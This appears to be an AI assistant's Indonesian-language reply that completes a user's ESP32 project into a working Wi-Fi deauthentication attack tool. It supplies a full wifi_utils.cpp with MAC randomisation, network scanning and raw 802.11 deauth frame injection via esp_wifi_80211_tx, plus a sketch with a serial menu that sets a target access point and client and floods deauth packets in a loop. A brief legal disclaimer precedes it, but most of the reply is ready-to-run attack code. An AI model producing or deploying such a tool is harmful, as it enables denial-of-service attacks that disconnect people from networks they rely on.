**⚠️ PERINGATAN KRITIS: SANGAT PENTING! ⚠️**

Kode yang akan kita bahas beroperasi pada level yang jauh lebih rendah dan lebih "kuat". Menggunakannya untuk memutuskan koneksi jaringan Wi-Fi yang **bukan milik Anda** atau **tanpa izin tertulis dari pemiliknya adalah ILEGAL** dan dapat dikenakan sanksi hukum yang berat. Gunakan **hanya untuk tujuan edukasi** pada jaringan Anda sendiri.

---

### Analisis Kode Anda (`wifi_utils.h`)

File header yang Anda berikan adalah kerangka yang sangat baik. Ini adalah pendekatan berorientasi objek untuk mengelola fungsi Wi-Fi. Kunci dari semuanya adalah fungsi `sendDeauthPacket`. Untuk membuatnya bekerja, kita perlu mengimplementasikan logika di dalam file `.cpp`.

### Implementasi `wifi_utils.cpp`

Berikut adalah implementasi lengkap untuk file `wifi_utils.cpp` Anda. File ini akan berisi logika untuk setiap fungsi yang Anda deklarasikan.

```cpp
// wifi_utils.cpp

#include "wifi_utils.h"
#include "esp_system.h"
#include "random.h"

// Konstruktor
WiFi_Utils::WiFi_Utils(bool random_mac) {
  random_mac_enable = random_mac;
}

// Inisialisasi Wi-Fi dalam mode yang dibutuhkan untuk serangan
bool WiFi_Utils::init() {
  WiFi.mode(WIFI_MODE_AP_STA); // Mode ini memungkinkan promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE); // Set ke channel awal
  
  if (random_mac_enable) {
    changeMACAddress();
  }

  mac_address = macAddress();
  Serial.println("Wi-Fi Utils Initialized. MAC Address: " + mac_address);
  isInit = true;
  return isInit;
}

// Scan jaringan Wi-Fi dan simpan dalam struktur data
wifiData WiFi_Utils::scanWifiList() {
  Serial.println("\n[INFO] Scanning networks...");
  wifi_list.ssid.clear();
  wifi_list.bssid.clear();
  wifi_list.channel.clear();
  wifi_list.signal.clear();

  int n = WiFi.scanNetworks(false, true, false, 300); // Async, show_hidden, passive, channel_time_ms
  Serial.println("[INFO] Scan complete.");
  if (n == 0) {
    Serial.println("[INFO] No networks found");
  } else {
    Serial.print((String)n + " networks found\n");
    for (int i = 0; i < n; ++i) {
      wifi_list.ssid.push_back(WiFi.SSID(i).c_str());
      wifi_list.bssid.push_back(WiFi.BSSIDstr(i).c_str());
      wifi_list.channel.push_back(WiFi.channel(i));
      wifi_list.signal.push_back(WiFi.RSSI(i));
    }
  }
  WiFi.scanDelete(); // Hapus hasil scan dari memori
  wifi_list.num = n;
  return wifi_list;
}

// Fungsi untuk mengubah alamat MAC
bool WiFi_Utils::changeMACAddress() {
  uint8_t new_mac[6];
  // Generate 3 byte acak untuk OUI (Organizationally Unique Identifier)
  // dan 3 byte acak untuk NIC (Network Interface Controller)
  for (int i = 0; i < 6; i++) {
    new_mac[i] = random(256);
  }
  // Set bit lokal dan unicast
  new_mac[0] |= 0x02; 
  new_mac[0] &= ~0x01;

  esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, new_mac);
  if (err == ESP_OK) {
    Serial.println("[INFO] MAC Address changed successfully.");
    return true;
  } else {
    Serial.println("[ERROR] Failed to change MAC Address.");
    return false;
  }
}

// Fungsi UTAMA: Mengirimkan paket Deauthentication
void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* client_mac) {
  // Struktur paket deauth
  // https://mrncciew.com/2014/10/08/802-11-mgmt-deauthentication-frame/
  uint8_t packet[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Frame Control
    /*  2 - 3  */ 0x00, 0x00,                         // Duration
    /*  4 - 9  */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination Address (client_mac)
    /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (bssid)
    /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (bssid)
    /* 22 - 23 */ 0x00, 0x00,                         // Sequence Number
    /* 24 - 25 */ 0x07, 0x00                          // Reason Code: 7 = Class 3 frame received from nonassociated STA
  };

  // Salin MAC address ke dalam paket
  memcpy(&packet[4], client_mac, 6);  // Tujuan adalah klien
  memcpy(&packet[10], bssid, 6);      // Sumber adalah AP
  memcpy(&packet[16], bssid, 6);      // BSSID adalah AP

  // Kirim paket menggunakan fungsi level rendah ESP-IDF
  // esp_wifi_80211_tx(interface, buffer, panjang, tidak di-enqueue)
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  
  delay(1); // Beri jeda singkat agar tidak membebani buffer
}

// Fungsi lainnya (konektivitas, port scanning) dapat diimplementasikan di sini
// ...

// Dapatkan MAC address saat ini
std::string WiFi_Utils::macAddress() {
  return WiFi.macAddress().c_str();
}
```

### Cara Menggunakannya di Sketch Utama (`.ino`)

Sekarang, Anda bisa menggunakan kelas `WiFi_Utils` ini di sketch utama Anda. Perhatikan bahwa dengan pendekatan ini, Anda harus lebih banyak menulis logika untuk memilih target dan menjalankan serangan.

```cpp
/*
 *  Contoh Penggunaan Kelas WiFi_Utils Kustom
 *  
 *  PERINGATAN: Gunakan hanya untuk edukasi dan pada jaringan yang Anda miliki.
 *  Penggunaan pada jaringan orang lain adalah ILEGAL.
 */

#include <Arduino.h>
#include <string>
#include "wifi_utils.h" // Sertakan header kustom Anda

// Buat objek dari kelas WiFi_Utils
// true = gunakan MAC address acak
WiFi_Utils wifi_util(true);

// Variabel untuk menyimpan target
bool isAttacking = false;
uint8_t target_ap_bssid[6];
uint8_t target_client_mac[6];
int target_channel = 1;

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Inisialisasi sistem Wi-Fi
  wifi_util.init();

  Serial.println("Sistem siap. Gunakan Serial Monitor untuk mengontrol.");
  printMenu();
}

void loop() {
  // Logika serangan
  if (isAttacking) {
    // Ubah channel sebelum mengirim paket
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    
    // Kirim paket deauth secara terus-menerus
    wifi_util.sendDeauthPacket(target_ap_bssid, target_client_mac);
    
    // LED built-in berkedip untuk indikator serangan
    digitalWrite(LED_BUILTIN, HIGH);
    delay(1);
    digitalWrite(LED_BUILTIN, LOW);
  }

  // Proses input dari Serial Monitor
  if (Serial.available() > 0) {
    char input = Serial.read();
    Serial.println(input);

    // Hentikan serangan jika ada input baru
    if (isAttacking) {
      isAttacking = false;
      Serial.println("[INFO] Serangan dihentikan.");
    }

    switch (input) {
      case '1': // Scan jaringan
        wifi_util.scanWifiList();
        printScanResults();
        printMenu();
        break;

      // Di sini Anda perlu logika untuk memilih AP dan Klien
      // Untuk contoh ini, kita akan hardcode target
      case '2': // Set target (hardcoded untuk contoh)
        // Ganti dengan MAC Address AP target Anda
        // Format: XX:XX:XX:XX:XX:XX
        parseMac("AA:BB:CC:DD:EE:FF", target_ap_bssid);
        // Ganti dengan MAC Address salah satu klien yang terhubung
        parseMac("11:22:33:44:55:66", target_client_mac);
        target_channel = 6; // Ganti dengan channel AP target

        Serial.println("[INFO] Target telah diset (hardcoded).");
        Serial.print("AP BSSID: "); printMac(target_ap_bssid);
        Serial.print("Client MAC: "); printMac(target_client_mac);
        Serial.println("Channel: " + String(target_channel));
        printMenu();
        break;

      case '3': // Mulai serangan
        if (memcmp(target_ap_bssid, "\0\0\0\0\0\0", 6) != 0) {
          Serial.println("[INFO] Memulai serangan...");
          isAttacking = true;
        } else {
          Serial.println("[ERROR] Target belum diset. Pilih target terlebih dahulu (menu 2).");
        }
        break;

      default:
        printMenu();
        break;
    }
  }
}

// --- Fungsi Bantuan ---

void printMenu() {
  Serial.println("\n--- Menu Deauther Kustom ---");
  Serial.println("1: Scan Jaringan Wi-Fi");
  Serial.println("2: Set Target (hardcoded untuk contoh)");
  Serial.println("3: Mulai Serangan");
  Serial.println("Karakter apapun: Hentikan Serangan");
  Serial.println("-------------------------------");
  Serial.print("Masukkan perintah: ");
}

void printScanResults() {
  if (wifi_util.wifi_list.num == 0) {
    Serial.println("Tidak ada jaringan ditemukan.");
    return;
  }
  Serial.println("\n--- Jaringan Ditemukan ---");
  for (int i = 0; i < wifi_util.wifi_list.num; i++) {
    Serial.print((String)(i + 1) + ": ");
    Serial.print(wifi_util.wifi_list.ssid[i]);
    Serial.print(" (");
    Serial.print(wifi_util.wifi_list.bssid[i]);
    Serial.print(", CH: ");
    Serial.print(wifi_util.wifi_list.channel[i]);
    Serial.println(")");
  }
}

// Fungsi untuk mengkonversi string MAC ke array uint8_t
void parseMac(String macStr, uint8_t* mac) {
  for (int i = 0; i < 6; ++i) {
    mac[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

// Fungsi untuk mencetak array MAC ke Serial
void printMac(const uint8_t* mac) {
  for (int i = 0; i < 6; ++i) {
    if (mac[i] < 16) Serial.print("0");
    Serial.print(mac[i], HEX);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}
```

### Perbedaan Utama dan Kesimpulan

1.  **Kontrol Penuh:** Dengan kode Anda sendiri, Anda memiliki kontrol penuh atas setiap bit dalam paket yang dikirim. Anda bisa memodifikasi `Reason Code`, `Frame Control`, dll.
2.  **Lebih Kompleks:** Anda harus menulis semua logika sendiri, mulai dari parsing hasil scan, menyimpan target, hingga loop serangan. Library `wifi_deauther` melakukan semua ini untuk Anda.
3.  **Pemahaman Lebih Dalam:** Ini adalah cara terbaik untuk benar-benar memahami bagaimana serangan Wi-Fi bekerja pada level paket.
4.  **Fungsi `sendDeauthPacket`:** Inti dari semuanya adalah fungsi ini. Ia membuat paket Deauthentication Frame secara manual dan mengirimkannya menggunakan fungsi `esp_wifi_80211_tx` dari ESP-IDF (SDK dasar ESP32). Ini adalah fungsi low-level yang memungkinkan injeksi paket.

Pendekatan yang Anda ambil dengan `wifi_utils.h` adalah langkah yang benar jika Anda ingin belajar lebih dalam. Kode yang saya berikan di atas adalah implementasi dari kerangka kerja Anda, yang menunjukkan "mesin" yang bekerja di balik layar.